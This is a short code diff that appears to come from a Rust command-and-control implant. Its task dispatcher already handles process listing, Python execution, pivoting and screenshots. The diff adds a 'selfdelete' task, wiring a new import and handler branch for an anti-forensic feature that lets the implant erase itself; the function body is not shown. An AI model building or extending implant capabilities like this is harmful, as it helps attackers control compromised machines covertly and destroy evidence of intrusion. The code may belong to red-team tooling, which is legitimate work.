@@ -12,6 +12,7 @@ use crate::features::executePY;
 use crate::features::list_processes;
 use crate::features::pivot;
 use crate::features::screenshot;
+use crate::features::selfdelete;
 
 pub fn getTasking() -> Result<(), Box<dyn std::error::Error>> {
     let checkin_data = serde_json::json!({
@@ -99,6 +100,10 @@ pub fn handleTask(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Er
         }
         "screenshot" => {
             screenshot::screenshot(task)?;
+            return Ok(());
+        }
+        "selfdelete" => {
+            selfdelete::selfdelete(task)?;
             return Ok(());
         }
         _ => {
